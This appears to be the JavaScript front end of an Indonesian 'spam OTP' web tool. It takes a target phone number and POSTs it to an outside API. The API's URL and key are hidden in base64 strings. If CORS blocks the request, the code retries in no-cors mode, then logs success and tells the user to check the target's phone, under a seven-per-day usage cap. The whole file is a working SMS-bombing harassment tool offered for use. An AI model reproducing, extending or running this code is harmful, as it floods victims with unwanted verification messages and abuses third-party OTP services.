/* ================= API CONFIG ================= */
const _p1 = atob('aHR0cHM6Ly9hcGkuamVyZXhkLm15LmlkL2FwaS90b29scy8=');
const _p2 = atob('c3BhbW90cD9hcGlrZXk9TjhicUtEeHoyZzV2WXBkdw==');
const API_URL = _p1 + _p2;


const DAILY_LIMIT = 7;
const LIMIT_KEY = 'spamOtp_count';
const DATE_KEY  = 'spamOtp_date';

/* ================= DOM ================= */
const phoneInput  = document.getElementById('phoneInput');
const sendBtn     = document.getElementById('sendBtn');
const sendText    = document.getElementById('sendText');
const consoleEl   = document.getElementById('console');
const channelModal = document.getElementById('channelModal');

/* ================= LIMIT HELPER ================= */
function getTodayStr() {
  return new Date().toISOString().slice(0, 10); // "YYYY-MM-DD"
}

function getUsage() {
  const savedDate = localStorage.getItem(DATE_KEY);
  const today     = getTodayStr();
  if (savedDate !== today) {
    // Hari baru → reset
    localStorage.setItem(DATE_KEY, today);
    localStorage.setItem(LIMIT_KEY, '0');
    return 0;
  }
  return parseInt(localStorage.getItem(LIMIT_KEY) || '0', 10);
}

function incrementUsage() {
  const used = getUsage() + 1;
  localStorage.setItem(LIMIT_KEY, String(used));
  localStorage.setItem(DATE_KEY, getTodayStr());
  return used;
}

function updateBtnLabel() {
  const used = getUsage();
  const sisa = DAILY_LIMIT - used;
  if (sisa <= 0) {
    sendBtn.disabled = true;
    sendText.textContent = `LIMIT HABIS (0/${DAILY_LIMIT})`;
  } else {
    sendBtn.disabled = false;
    sendText.textContent = `KIRIM SPAM OTP (${sisa}/${DAILY_LIMIT})`;
  }
}

/* ================= LOGGER ================= */
function log(msg, type = 'info') {
  const time = new Date().toLocaleTimeString('en-US', { hour12: false });
  const line = document.createElement('div');
  line.className = `log-line ${type}`;
  line.textContent = `[${time}] ${msg}`;
  consoleEl.appendChild(line);
  consoleEl.scrollTop = consoleEl.scrollHeight;
}

/* ================= POP-UP LOGIC ================= */
setTimeout(() => {
  const hasSeen = localStorage.getItem('hasSeenChannel');
  if (!hasSeen) {
    channelModal.classList.add('active');
    localStorage.setItem('hasSeenChannel', 'true');
  }
}, 3000);

function closeModal() {
  channelModal.classList.remove('active');
}

/* ================= INIT ================= */
document.addEventListener('DOMContentLoaded', () => {
  const used = getUsage();
  updateBtnLabel();
  if (used > 0) {
    log(`Sisa penggunaan hari ini: ${DAILY_LIMIT - used}/${DAILY_LIMIT}`, 'warn');
  }
});

/* ================= SEND SPAM ================= */
async function sendSpam() {
  const used = getUsage();
  if (used >= DAILY_LIMIT) {
    log(`❌ Limit harian tercapai (${DAILY_LIMIT}x). Coba lagi besok.`, 'error');
    updateBtnLabel();
    return;
  }

  const phone = phoneInput.value.trim().replace(/[\s\+\-]/g, '');

  if (!phone) {
    log('Nomor target tidak boleh kosong!', 'error');
    phoneInput.focus();
    return;
  }
  if (phone.length < 9) {
    log('Nomor tidak valid. Minimal 9 digit.', 'error');
    return;
  }

  const payload = { "nomor": phone };

  sendBtn.disabled = true;
  sendText.textContent = 'MEMPROSES...';
  log(`Mengirim request ke nomor: ${phone}...`, 'info');

  let success = false;

  // 1. Direct Fetch
  try {
    const res = await fetch(API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (res.ok) {
      const txt = await res.text();
      log(`✅ SUCCESS (Direct): ${txt.substring(0, 100)}`, 'success');
      success = true;
    }
  } catch (e) {
    log('Direct diblokir CORS, mencoba Force Send...', 'warn');
  }

  // 2. No-CORS Mode
  if (!success) {
    log('Proxy gagal. Mencoba Force Send (No-CORS)...', 'warn');
    try {
      await fetch(API_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      log(`✅ SUCCESS (Force Sent): Request berhasil dikirim!`, 'success');
      success = true;
    } catch (e) {
      log(`❌ GAGAL: Server down atau API Key invalid.`, 'error');
    }
  }

  if (success) {
    const nowUsed = incrementUsage();
    const sisa = DAILY_LIMIT - nowUsed;
    log(`🎯 Proses selesai. Cek HP target (${phone}).`, 'success');
    log(`📊 Sisa penggunaan hari ini: ${sisa}/${DAILY_LIMIT}`, 'warn');
  }

  updateBtnLabel();
}
